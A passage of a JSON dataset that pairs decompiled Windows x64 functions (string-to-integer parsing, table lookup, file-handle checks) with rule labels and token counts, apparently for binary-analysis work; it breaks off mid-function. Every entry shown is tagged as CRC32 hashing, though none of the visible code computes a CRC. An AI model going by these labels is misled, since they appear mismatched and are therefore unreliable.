        "decompiled_code": "\nuint64_t fcn.140024f44(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    ulong arg1_00;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    \n    if (((((arg1 & 0xfffff3ff) != 0) || (arg1 == 0xc00)) && ((arg2 != 0 || (arg3 < 1)))) && (-1 < arg3)) {\n        iVar6 = 0;\n        iVar5 = 0xe3;\n        do {\n            iVar4 = (iVar5 + iVar6) / 2;\n            uVar1 = *(iVar4 * 0x10 + 0x140034bb0);\n            iVar8 = arg1 - uVar1;\n            if (arg1 == uVar1) {\n                if (iVar4 < 0) {\n                    return 0;\n                }\n                arg1_00 = *(iVar4 * 0x10 + 0x140034bb8);\n                iVar5 = fcn.140015bc8(arg1_00, 0x55);\n                if (0 < arg3) {\n                    if (arg3 <= iVar5) {\n                        return 0;\n                    }\n                    iVar6 = fcn.14001f634(arg2, arg3, arg1_00);\n                    if (iVar6 != 0) {\n                        fcn.14000c078(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        uVar7 = (*pcVar2)();\n                        return uVar7;\n                    }\n                }\n                return iVar5 + 1;\n            }\n            iVar3 = iVar4 + -1;\n            if (-1 < iVar8) {\n                iVar3 = iVar5;\n            }\n            iVar5 = iVar3;\n            if (-1 < iVar8) {\n                iVar6 = iVar4 + 1;\n            }\n        } while (iVar6 <= iVar5);\n    }\n    return 0;\n}\n",
        "token_count": 478
    },
    "14000c2f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14000c2f0(uint64_t arg1, ushort *arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int64_t in_stack_00000028;\n    ulong var_3a0h;\n    ulong var_3a8h;\n    ulong var_3b0h;\n    ulong var_3b8h;\n    ulong var_3c0h;\n    uchar auStack1288 [32];\n    ulong uStack1256;\n    ushort *puStack1240;\n    int64_t iStack1232;\n    int64_t iStack1224;\n    uchar uStack1216;\n    uint uStack1215;\n    ushort uStack1211;\n    uchar uStack1209;\n    uint64_t auStack1208 [2];\n    int64_t iStack1192;\n    uint uStack1176;\n    uchar uStack1172;\n    ulong uStack1168;\n    uint uStack1160;\n    uchar uStack1152;\n    ushort uStack1150;\n    uint uStack1136;\n    uchar uStack1132;\n    ulong var_80h;\n    ulong var_bp_78h;\n    ulong var_bp_68h;\n    uchar auStack104 [16];\n    ushort **ppuStack88;\n    uint uStack80;\n    uint64_t uStack72;\n    \n    uStack72 = *0x14003e020 ^ auStack1288;\n    if ((arg4 == 0) || ((arg3 != 0 && (arg2 == NULL)))) {\n        *(in_stack_00000028 + 0x30) = 1;\n        *(in_stack_00000028 + 0x2c) = 0x16;\n        uStack1256 = 0;\n        fcn.14000bf58(0, 0, 0, 0);\n        goto code_r0x00014000c469;\n    }\n    uStack1215 = 0;\n    uStack1211 = 0;\n    uStack1209 = 0;\n    iStack1224 = 0;\n    if (((arg1 & 2) != 0) || (uStack1216 = 0,  arg2 == NULL)) {\n        uStack1216 = 1;\n    }\n    ppuStack88 = &puStack1240;\n    uStack1176 = 0;\n    uStack1172 = 0;\n    uStack1168 = 0;\n    uStack1160 = 0;\n    uStack1152 = 0;\n    uStack1150 = 0;\n    uStack1136 = 0;\n    uStack1132 = 0;\n    auStack104 = ZEXT816(0);\n    uStack80 = 0;\n    puStack1240 = arg2;\n    iStack1232 = arg3;\n    auStack1208[0] = arg1;\n    iStack1192 = arg4;\n    iVar1 = fcn.14000e928(auStack1208);\n    if (arg2 != NULL) {\n        if ((arg1 & 1) == 0) {\n            if ((arg1 & 2) == 0) {\n                if (arg3 != 0) {\n                    if (iStack1224 != arg3) goto code_r0x00014000c456;\ncode_r0x00014000c49e:\n                    arg2[arg3 + -1] = 0;\n                }\n            }\n            else if (arg3 != 0) {\n                if (-1 < iVar1) {\n                    if (iStack1224 == arg3) goto code_r0x00014000c49e;\n                    goto code_r0x00014000c456;\n                }\n                *arg2 = 0;\n            }\n        }\n        else if (((arg3 != 0) || (iVar1 == 0)) && (iStack1224 != arg3)) {\ncode_r0x00014000c456:\n            arg2[iStack1224] = 0;\n        }\n    }\n    fcn.140019b4c(auStack104._8_8_);\ncode_r0x00014000c469:\n    fcn.140005b20(uStack72 ^ auStack1288);\n    return;\n}\n",
        "token_count": 938
    },
    "14000c8e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.14000c8ec(int64_t arg1, uint16_t **arg2, ulong arg3)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t **ppuVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint16_t uVar11;\n    uint32_t uVar12;\n    uint32_t in_R9D;\n    uint64_t uVar13;\n    int32_t iStack152;\n    \n    puVar2 = *arg2;\n    uVar13 = arg3;\n    if (puVar2 == NULL) {\n        puVar7 = fcn.140012c78();\n        *puVar7 = 0x16;\n        fcn.14000c028();\ncode_r0x00014000c965:\n        if (arg2[1] != NULL) {\n            *arg2[1] = *arg2;\n        }\n        return 0;\n    }\n    if ((arg3 != 0) && (0x22 < arg3 - 2)) {\n        *(arg1 + 0x30) = 1;\n        *(arg1 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        goto code_r0x00014000c965;\n    }\n    uVar11 = *puVar2;\n    *arg2 = puVar2 + 1;\n    uVar12 = in_R9D & 0xff | 2;\n    if (uVar11 != 0x2d) {\n        uVar12 = in_R9D & 0xff;\n    }\n    if ((uVar11 - 0x2b & 0xfffd) == 0) {\n        uVar11 = puVar2[1];\n        *arg2 = puVar2 + 2;\n    }\n    iStack152 = 0xae6;\n    uVar8 = uVar13;\n    if ((arg3 & 0xffffffef) != 0) goto code_r0x00014000cd20;\n    if (uVar11 < 0x30) goto code_r0x00014000cc6f;\n    iVar5 = 0x30;\n    if (uVar11 < 0x3a) {\ncode_r0x00014000cab4:\n        iVar5 = uVar11 - iVar5;\ncode_r0x00014000cc6a:\n        if (iVar5 == -1) goto code_r0x00014000cc6f;\ncode_r0x00014000cc91:\n        if (iVar5 != 0) goto code_r0x00014000cd11;\n        puVar3 = *arg2;\n        uVar1 = *puVar3;\n        *arg2 = puVar3 + 1;\n        if ((uVar1 - 0x58 & 0xffdf) != 0) {\n            *arg2 = puVar3;\n            uVar8 = 8;\n            if (arg3 != 0) {\n                uVar8 = uVar13;\n            }\n            if ((uVar1 != 0) && (*puVar3 != uVar1)) {\n                puVar7 = fcn.140012c78();\n                *puVar7 = 0x16;\n                fcn.14000c028();\n            }\n            goto code_r0x00014000cd20;\n        }\n        uVar11 = puVar3[1];\n        *arg2 = puVar3 + 2;\n        uVar8 = 0x10;\n    }\n    else {\n        if (uVar11 < 0xff10) {\n            if (0x65f < uVar11) {\n                if (uVar11 < 0x66a) {\n                    iVar5 = uVar11 - 0x660;\n                    goto code_r0x00014000cc6a;\n                }\n                if (0x6ef < uVar11) {\n                    if (uVar11 < 0x6fa) {\n                        iVar5 = uVar11 - 0x6f0;\n                        goto code_r0x00014000cc6a;\n                    }\n                    if (0x965 < uVar11) {\n                        if (uVar11 < 0x970) {\n                            iVar5 = uVar11 - 0x966;\n                            goto code_r0x00014000cc6a;\n                        }\n                        if (0x9e5 < uVar11) {\n                            if (uVar11 < 0x9f0) {\n                                iVar5 = uVar11 - 0x9e6;\n                                goto code_r0x00014000cc6a;\n                            }\n                            if (0xa65 < uVar11) {\n                                if (uVar11 < 0xa70) {\n                                    iVar5 = uVar11 - 0xa66;\n                                    goto code_r0x00014000cc6a;\n                                }\n                                if ((0xae5 < uVar11) &&\n                                   ((iVar5 = iStack152,  uVar11 < 0xaf0 ||\n                                    ((iVar5 = 0xb66,  0xb65 < uVar11 &&\n                                     ((uVar11 < 0xb70 ||\n                                      ((iVar5 = 0xc66,  0xc65 < uVar11 &&\n                                       ((uVar11 < 0xc70 ||\n                                        ((iVar5 = 0xce6,  0xce5 < uVar11 &&\n                                         ((uVar11 < 0xcf0 ||\n                                          ((iVar5 = 0xd66,  0xd65 < uVar11 &&\n                                           ((uVar11 < 0xd70 ||\n                                            ((iVar5 = 0xe50,  0xe4f < uVar11 &&\n                                             ((uVar11 < 0xe5a ||\n                                              ((iVar5 = 0xed0,  0xecf < uVar11 &&\n                                               ((uVar11 < 0xeda ||\n                                                ((iVar5 = 0xf20,  0xf1f < uVar11 &&\n                                                 ((uVar11 < 0xf2a ||\n                                                  ((iVar5 = 0x1040,  0x103f < uVar11 &&\n                                                   ((uVar11 < 0x104a ||\n                                                    ((iVar5 = 0x17e0,  0x17df < uVar11 &&\n                                                     ((uVar11 < 0x17ea || (iVar5 = 0x1810,  uVar11 + 0xe7f0 < 10))))))))\n                                                  )))))))))))))))))))))))))))))))) goto code_r0x00014000cab4;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        else if (uVar11 < 0xff1a) {\n            iVar5 = uVar11 - 0xff10;\n            goto code_r0x00014000cc6a;\n        }\ncode_r0x00014000cc6f:\n        uVar9 = uVar11;\n        if ((uVar11 - 0x41 < 0x1a) || (uVar11 - 0x61 < 0x1a)) {\n            if (uVar11 - 0x61 < 0x1a) {\n                uVar9 = uVar11 - 0x20;\n            }\n            iVar5 = uVar9 - 0x37;\n            goto code_r0x00014000cc91;\n        }\ncode_r0x00014000cd11:\n        uVar8 = 10;\n    }\n    if (arg3 != 0) {\n        uVar8 = uVar13;\n    }\ncode_r0x00014000cd20:\n    uVar9 = 0;\n    do {\n        if (uVar11 < 0x30) goto code_r0x00014000cef0;\n        if (uVar11 < 0x3a) {\n            uVar10 = uVar11 - 0x30;\ncode_r0x00014000ceeb:\n            if (uVar10 == 0xffffffff) goto code_r0x00014000cef0;\n        }\n        else {\n            if (uVar11 < 0xff10) {\n                if (0x65f < uVar11) {\n                    if (uVar11 < 0x66a) {\n                        uVar10 = uVar11 - 0x660;\n                        goto code_r0x00014000ceeb;\n                    }\n                    if (0x6ef < uVar11) {\n                        if (uVar11 < 0x6fa) {\n                            uVar10 = uVar11 - 0x6f0;\n                            goto code_r0x00014000ceeb;\n                        }\n                        if (0x965 < uVar11) {\n                            if (uVar11 < 0x970) {\n                                uVar10 = uVar11 - 0x966;\n                                goto code_r0x00014000ceeb;\n                            }\n                            if (0x9e5 < uVar11) {\n                                iVar5 = 0x9e6;\n                                if (uVar11 < 0x9f0) {\ncode_r0x00014000cdcf:\n                                    uVar10 = uVar11 - iVar5;\n                                    goto code_r0x00014000ceeb;\n                                }\n                                if (0xa65 < uVar11) {\n                                    iVar5 = 0xa66;\n                                    if (uVar11 < 0xa70) goto code_r0x00014000cdcf;\n                                    if (0xae5 < uVar11) {\n                                        iVar5 = iStack152;\n                                        if (uVar11 < 0xaf0) goto code_r0x00014000cdcf;\n                                        iVar5 = 0xb66;\n                                        if (0xb65 < uVar11) {\n                                            if (uVar11 < 0xb70) goto code_r0x00014000cdcf;\n                                            iVar5 = 0xc66;\n                                            if (0xc65 < uVar11) {\n                                                if (uVar11 < 0xc70) goto code_r0x00014000cdcf;\n                                                iVar5 = 0xce6;\n                                                if (0xce5 < uVar11) {\n                                                    if (uVar11 < 0xcf0) goto code_r0x00014000cdcf;\n                                                    iVar5 = 0xd66;\n                                                    if (0xd65 < uVar11) {\n                                                        if (uVar11 < 0xd70) goto code_r0x00014000cdcf;\n                                                        iVar5 = 0xe50;\n                                                        if (0xe4f < uVar11) {\n                                                            if (uVar11 < 0xe5a) goto code_r0x00014000cdcf;\n                                                            iVar5 = 0xed0;\n                                                            if (0xecf < uVar11) {\n                                                                if (uVar11 < 0xeda) goto code_r0x00014000cdcf;\n                                                                iVar5 = 0xf20;\n                                                                if (0xf1f < uVar11) {\n                                                                    if (uVar11 < 0xf2a) goto code_r0x00014000cdcf;\n                                                                    iVar5 = 0x1040;\n                                                                    if (0x103f < uVar11) {\n                                                                        if (uVar11 < 0x104a) goto code_r0x00014000cdcf;\n                                                                        iVar5 = 0x17e0;\n                                                                        if (0x17df < uVar11) {\n                                                                            if (uVar11 < 0x17ea)\n                                                                            goto code_r0x00014000cdcf;\n                                                                            if (uVar11 + 0xe7f0 < 10) {\n                                                                                uVar10 = uVar11 - 0x1810;\n                                                                                goto code_r0x00014000ceeb;\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else if (uVar11 < 0xff1a) {\n                uVar10 = uVar11 - 0xff10;\n                goto code_r0x00014000ceeb;\n            }\ncode_r0x00014000cef0:\n            uVar10 = uVar11;\n            if ((uVar11 - 0x41 < 0x1a) || (uVar11 - 0x61 < 0x1a)) {\n                if (uVar11 - 0x61 < 0x1a) {\n                    uVar10 = uVar10 - 0x20;\n                }\n                uVar10 = uVar10 - 0x37;\n            }\n            else {\n                uVar10 = 0xffffffff;\n            }\n        }\n        puVar3 = *arg2;\n        if (uVar8 <= uVar10) break;\n        uVar11 = *puVar3;\n        uVar6 = uVar9 * uVar8;\n        uVar10 = uVar6 + uVar10;\n        *arg2 = puVar3 + 1;\n        uVar12 = uVar12 | (uVar10 < uVar6 || 0xffffffff / uVar8 < uVar9) << 2 | 8;\n        uVar9 = uVar10;\n    } while( true );\n    *arg2 = puVar3 + -1;\n    if ((uVar11 != 0) && (puVar3[-1] != uVar11)) {\n        puVar7 = fcn.140012c78();\n        *puVar7 = 0x16;\n        fcn.14000c028();\n    }\n    if ((uVar12 & 8) == 0) {\n        *arg2 = puVar2;\n        if (arg2[1] == NULL) {\n            return 0;\n        }\n        *arg2[1] = puVar2;\n        return 0;\n    }\n    if ((uVar12 & 4) == 0) {\n        if ((uVar12 & 1) == 0) {\n            if ((uVar12 & 2) == 0) goto code_r0x00014000d017;\ncode_r0x00014000d015:\n            uVar9 = -uVar9;\n            goto code_r0x00014000d017;\n        }\n        if ((uVar12 & 2) == 0) {\n            if (uVar9 < 0x80000000) goto code_r0x00014000d017;\n        }\n        else if (uVar9 < 0x80000001) goto code_r0x00014000d015;\n    }\n    *(arg1 + 0x30) = 1;\n    *(arg1 + 0x2c) = 0x22;\n    if ((uVar12 & 1) != 0) {\n        ppuVar4 = arg2[1];\n        if ((uVar12 & 2) == 0) {\n            if (ppuVar4 != NULL) {\n                *ppuVar4 = *arg2;\n            }\n            return 0x7fffffff;\n        }\n        if (ppuVar4 != NULL) {\n            *ppuVar4 = *arg2;\n        }\n        return 0x80000000;\n    }\n    uVar9 = 0xffffffff;\ncode_r0x00014000d017:\n    if (arg2[1] != NULL) {\n        *arg2[1] = *arg2;\n        return uVar9;\n    }\n    return uVar9;\n}\n",
        "token_count": 3422
    },
    "140018b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.140018b00(int64_t arg1, uint16_t **arg2, ulong arg3)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint16_t **ppuVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint64_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint16_t uVar11;\n    uint32_t uVar12;\n    uint32_t in_R9D;\n    uint64_t uVar13;\n    int32_t iStack152;\n    \n    puVar2 = *arg2;\n    uVar13 = arg3;\n    if (puVar2 == NULL) {\n        puVar7 = fcn.140012c78();\n        *puVar7 = 0x16;\n        fcn.14000c028();\ncode_r0x000140018b7d:\n        if (arg2[1] != NULL) {\n            *arg2[1] = *arg2;\n        }\n        return 0;\n    }\n    if ((arg3 != 0) && (0x22 < arg3 - 2)) {\n        *(arg1 + 0x30) = 1;\n        *(arg1 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        goto code_r0x000140018b7d;\n    }\n    uVar11 = *puVar2;\n    *arg2 = puVar2 + 1;\n    if (*(arg1 + 0x28) == '\\0') {\n        fcn.140010150(arg1);\n    }\n    while (iVar5 = fcn.14001fe94(uVar11, 8),  iVar5 != 0) {\n        uVar11 = **arg2;\n        *arg2 = *arg2 + 1;\n    }\n    uVar12 = in_R9D & 0xff | 2;\n    if (uVar11 != 0x2d) {\n        uVar12 = in_R9D & 0xff;\n    }\n    if ((uVar11 - 0x2b & 0xfffd) == 0) {\n        uVar11 = **arg2;\n        *arg2 = *arg2 + 1;\n    }\n    iStack152 = 0xae6;\n    uVar8 = uVar13;\n    if ((arg3 & 0xffffffef) != 0) goto code_r0x000140018f64;\n    if (uVar11 < 0x30) goto code_r0x000140018eb3;\n    iVar5 = 0x30;\n    if (uVar11 < 0x3a) {\ncode_r0x000140018cf8:\n        iVar5 = uVar11 - iVar5;\ncode_r0x000140018eae:\n        if (iVar5 == -1) goto code_r0x000140018eb3;\ncode_r0x000140018ed5:\n        if (iVar5 != 0) goto code_r0x000140018f55;\n        puVar3 = *arg2;\n        uVar1 = *puVar3;\n        *arg2 = puVar3 + 1;\n        if ((uVar1 - 0x58 & 0xffdf) != 0) {\n            *arg2 = puVar3;\n            uVar8 = 8;\n            if (arg3 != 0) {\n                uVar8 = uVar13;\n            }\n            if ((uVar1 != 0) && (*puVar3 != uVar1)) {\n                puVar7 = fcn.140012c78();\n                *puVar7 = 0x16;\n                fcn.14000c028();\n            }\n            goto code_r0x000140018f64;\n        }\n        uVar11 = puVar3[1];\n        *arg2 = puVar3 + 2;\n        uVar8 = 0x10;\n    }\n    else {\n        if (uVar11 < 0xff10) {\n            if (0x65f < uVar11) {\n                if (uVar11 < 0x66a) {\n                    iVar5 = uVar11 - 0x660;\n                    goto code_r0x000140018eae;\n                }\n                if (0x6ef < uVar11) {\n                    if (uVar11 < 0x6fa) {\n                        iVar5 = uVar11 - 0x6f0;\n                        goto code_r0x000140018eae;\n                    }\n                    if (0x965 < uVar11) {\n                        if (uVar11 < 0x970) {\n                            iVar5 = uVar11 - 0x966;\n                            goto code_r0x000140018eae;\n                        }\n                        if (0x9e5 < uVar11) {\n                            if (uVar11 < 0x9f0) {\n                                iVar5 = uVar11 - 0x9e6;\n                                goto code_r0x000140018eae;\n                            }\n                            if (0xa65 < uVar11) {\n                                if (uVar11 < 0xa70) {\n                                    iVar5 = uVar11 - 0xa66;\n                                    goto code_r0x000140018eae;\n                                }\n                                if ((0xae5 < uVar11) &&\n                                   ((iVar5 = iStack152,  uVar11 < 0xaf0 ||\n                                    ((iVar5 = 0xb66,  0xb65 < uVar11 &&\n                                     ((uVar11 < 0xb70 ||\n                                      ((iVar5 = 0xc66,  0xc65 < uVar11 &&\n                                       ((uVar11 < 0xc70 ||\n                                        ((iVar5 = 0xce6,  0xce5 < uVar11 &&\n                                         ((uVar11 < 0xcf0 ||\n                                          ((iVar5 = 0xd66,  0xd65 < uVar11 &&\n                                           ((uVar11 < 0xd70 ||\n                                            ((iVar5 = 0xe50,  0xe4f < uVar11 &&\n                                             ((uVar11 < 0xe5a ||\n                                              ((iVar5 = 0xed0,  0xecf < uVar11 &&\n                                               ((uVar11 < 0xeda ||\n                                                ((iVar5 = 0xf20,  0xf1f < uVar11 &&\n                                                 ((uVar11 < 0xf2a ||\n                                                  ((iVar5 = 0x1040,  0x103f < uVar11 &&\n                                                   ((uVar11 < 0x104a ||\n                                                    ((iVar5 = 0x17e0,  0x17df < uVar11 &&\n                                                     ((uVar11 < 0x17ea || (iVar5 = 0x1810,  uVar11 + 0xe7f0 < 10))))))))\n                                                  )))))))))))))))))))))))))))))))) goto code_r0x000140018cf8;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        else if (uVar11 < 0xff1a) {\n            iVar5 = uVar11 - 0xff10;\n            goto code_r0x000140018eae;\n        }\ncode_r0x000140018eb3:\n        uVar9 = uVar11;\n        if ((uVar11 - 0x41 < 0x1a) || (uVar11 - 0x61 < 0x1a)) {\n            if (uVar11 - 0x61 < 0x1a) {\n                uVar9 = uVar11 - 0x20;\n            }\n            iVar5 = uVar9 - 0x37;\n            goto code_r0x000140018ed5;\n        }\ncode_r0x000140018f55:\n        uVar8 = 10;\n    }\n    if (arg3 != 0) {\n        uVar8 = uVar13;\n    }\ncode_r0x000140018f64:\n    uVar9 = 0;\n    do {\n        if (uVar11 < 0x30) goto code_r0x000140019134;\n        if (uVar11 < 0x3a) {\n            uVar10 = uVar11 - 0x30;\ncode_r0x00014001912f:\n            if (uVar10 == 0xffffffff) goto code_r0x000140019134;\n        }\n        else {\n            if (uVar11 < 0xff10) {\n                if (0x65f < uVar11) {\n                    if (uVar11 < 0x66a) {\n                        uVar10 = uVar11 - 0x660;\n                        goto code_r0x00014001912f;\n                    }\n                    if (0x6ef < uVar11) {\n                        if (uVar11 < 0x6fa) {\n                            uVar10 = uVar11 - 0x6f0;\n                            goto code_r0x00014001912f;\n                        }\n                        if (0x965 < uVar11) {\n                            if (uVar11 < 0x970) {\n                                uVar10 = uVar11 - 0x966;\n                                goto code_r0x00014001912f;\n                            }\n                            if (0x9e5 < uVar11) {\n                                iVar5 = 0x9e6;\n                                if (uVar11 < 0x9f0) {\ncode_r0x000140019013:\n                                    uVar10 = uVar11 - iVar5;\n                                    goto code_r0x00014001912f;\n                                }\n                                if (0xa65 < uVar11) {\n                                    iVar5 = 0xa66;\n                                    if (uVar11 < 0xa70) goto code_r0x000140019013;\n                                    if (0xae5 < uVar11) {\n                                        iVar5 = iStack152;\n                                        if (uVar11 < 0xaf0) goto code_r0x000140019013;\n                                        iVar5 = 0xb66;\n                                        if (0xb65 < uVar11) {\n                                            if (uVar11 < 0xb70) goto code_r0x000140019013;\n                                            iVar5 = 0xc66;\n                                            if (0xc65 < uVar11) {\n                                                if (uVar11 < 0xc70) goto code_r0x000140019013;\n                                                iVar5 = 0xce6;\n                                                if (0xce5 < uVar11) {\n                                                    if (uVar11 < 0xcf0) goto code_r0x000140019013;\n                                                    iVar5 = 0xd66;\n                                                    if (0xd65 < uVar11) {\n                                                        if (uVar11 < 0xd70) goto code_r0x000140019013;\n                                                        iVar5 = 0xe50;\n                                                        if (0xe4f < uVar11) {\n                                                            if (uVar11 < 0xe5a) goto code_r0x000140019013;\n                                                            iVar5 = 0xed0;\n                                                            if (0xecf < uVar11) {\n                                                                if (uVar11 < 0xeda) goto code_r0x000140019013;\n                                                                iVar5 = 0xf20;\n                                                                if (0xf1f < uVar11) {\n                                                                    if (uVar11 < 0xf2a) goto code_r0x000140019013;\n                                                                    iVar5 = 0x1040;\n                                                                    if (0x103f < uVar11) {\n                                                                        if (uVar11 < 0x104a) goto code_r0x000140019013;\n                                                                        iVar5 = 0x17e0;\n                                                                        if (0x17df < uVar11) {\n                                                                            if (uVar11 < 0x17ea)\n                                                                            goto code_r0x000140019013;\n                                                                            if (uVar11 + 0xe7f0 < 10) {\n                                                                                uVar10 = uVar11 - 0x1810;\n                                                                                goto code_r0x00014001912f;\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else if (uVar11 < 0xff1a) {\n                uVar10 = uVar11 - 0xff10;\n                goto code_r0x00014001912f;\n            }\ncode_r0x000140019134:\n            uVar10 = uVar11;\n            if ((uVar11 - 0x41 < 0x1a) || (uVar11 - 0x61 < 0x1a)) {\n                if (uVar11 - 0x61 < 0x1a) {\n                    uVar10 = uVar10 - 0x20;\n                }\n                uVar10 = uVar10 - 0x37;\n            }\n            else {\n                uVar10 = 0xffffffff;\n            }\n        }\n        puVar3 = *arg2;\n        if (uVar8 <= uVar10) break;\n        uVar11 = *puVar3;\n        uVar6 = uVar9 * uVar8;\n        uVar10 = uVar6 + uVar10;\n        *arg2 = puVar3 + 1;\n        uVar12 = uVar12 | (uVar10 < uVar6 || 0xffffffff / uVar8 < uVar9) << 2 | 8;\n        uVar9 = uVar10;\n    } while( true );\n    *arg2 = puVar3 + -1;\n    if ((uVar11 != 0) && (puVar3[-1] != uVar11)) {\n        puVar7 = fcn.140012c78();\n        *puVar7 = 0x16;\n        fcn.14000c028();\n    }\n    if ((uVar12 & 8) == 0) {\n        *arg2 = puVar2;\n        if (arg2[1] == NULL) {\n            return 0;\n        }\n        *arg2[1] = puVar2;\n        return 0;\n    }\n    if ((uVar12 & 4) == 0) {\n        if ((uVar12 & 1) == 0) {\n            if ((uVar12 & 2) == 0) goto code_r0x00014001925b;\ncode_r0x000140019259:\n            uVar9 = -uVar9;\n            goto code_r0x00014001925b;\n        }\n        if ((uVar12 & 2) == 0) {\n            if (uVar9 < 0x80000000) goto code_r0x00014001925b;\n        }\n        else if (uVar9 < 0x80000001) goto code_r0x000140019259;\n    }\n    *(arg1 + 0x30) = 1;\n    *(arg1 + 0x2c) = 0x22;\n    if ((uVar12 & 1) != 0) {\n        ppuVar4 = arg2[1];\n        if ((uVar12 & 2) == 0) {\n            if (ppuVar4 != NULL) {\n                *ppuVar4 = *arg2;\n            }\n            return 0x7fffffff;\n        }\n        if (ppuVar4 != NULL) {\n            *ppuVar4 = *arg2;\n        }\n        return 0x80000000;\n    }\n    uVar9 = 0xffffffff;\ncode_r0x00014001925b:\n    if (arg2[1] != NULL) {\n        *arg2[1] = *arg2;\n        return uVar9;\n    }\n    return uVar9;\n}\n",
        "token_count": 3473
    },
    "14001bd0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.14001bd04(ulong noname_0, ulong *arg2, ulong arg3)\n\n{\n    if ((noname_0 != '\\0') && ((*(arg2 + 0x14) >> 9 & 1) != 0)) {\n        fcn.140010ac0(arg2, arg3);\n        LOCK();\n        *(arg2 + 0x14) = *(arg2 + 0x14) & 0xfffffd7f;\n        *(arg2 + 4) = 0;\n        arg2[1] = 0;\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "14001bd4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.14001bd40(ulong noname_0, uint32_t *arg2, uint32_t **arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t *arg2_00;\n    uint uVar2;\n    \n    fcn.140022374(*arg2);\n    uVar1 = **arg3;\n    arg2_00 = arg3[1];\n    if ((*(*((uVar1 >> 6) * 8 + 0x1400403d0) + 0x38 + (uVar1 & 0x3f) * 0x48) & 1) == 0) {\n        *(arg2_00 + 0xc) = 1;\n        arg2_00[0xb] = 9;\n        uVar2 = 0xffffffff;\n    }\n    else {\n        uVar2 = fcn.14001be7c(uVar1, arg2_00);\n    }\n    fcn.14002239c(*arg4);\n    return uVar2;\n}\n",
        "token_count": 236
    },
    "14001bdb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong fcn.14001bdb8(ulong arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    uint32_t auStackX8 [4];\n    uchar auStackX24 [8];\n    uint32_t auStackX32 [2];\n    uint32_t auStack40 [2];\n    uint32_t *puStack32;\n    int64_t iStack24;\n    \n    if (arg1 == 0xfffffffe) {\n        *(arg2 + 0x38) = 1;\n        *(arg2 + 0x34) = 0;\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 9;\n    }\n    else {\n        auStackX8[0] = arg1;\n        if (((-1 < arg1) && (arg1 < *0x1400407d0)) &&\n           ((*(*((arg1 >> 6) * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) != 0)) {\n            puStack32 = auStackX8;\n            auStackX32[0] = arg1;\n            auStack40[0] = arg1;\n            iStack24 = arg2;\n            uVar1 = fcn.14001bd40(auStackX24, auStack40, &puStack32, auStackX32);\n            return uVar1;\n        }\n        *(arg2 + 0x38) = 1;\n        *(arg2 + 0x34) = 0;\n        *(arg2 + 0x30) = 1;\n        *(arg2 + 0x2c) = 9;\n        fcn.14000bf58(0, 0, 0, 0);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 417
    },
    "14001c8a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.14001c8a4(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    uint64_t uVar2;\n    \n    if (arg1 == 0xfffffffe) {\n        *(arg4 + 0x38) = 1;\n        *(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 9;\n    }\n    else {\n        if ((-1 < arg1) && (arg1 < *0x1400407d0)) {\n            uVar2 = arg1 >> 6;\n            if ((*(*(uVar2 * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) != 0) {\n                fcn.140022374(arg1 & 0xffffffff);\n                uVar1 = 0xffffffff;\n                if ((*(*(uVar2 * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48) & 1) == 0) {\n                    *(arg4 + 0x30) = 1;\n                    *(arg4 + 0x2c) = 9;\n                    *(arg4 + 0x38) = 1;\n                    *(arg4 + 0x34) = 0;\n                }\n                else {\n                    uVar1 = fcn.14001c9cc(arg1, arg2, arg3, arg4);\n                }\n                fcn.14002239c(arg1);\n                return uVar1;\n            }\n        }\n        *(arg4 + 0x38) = 1;\n        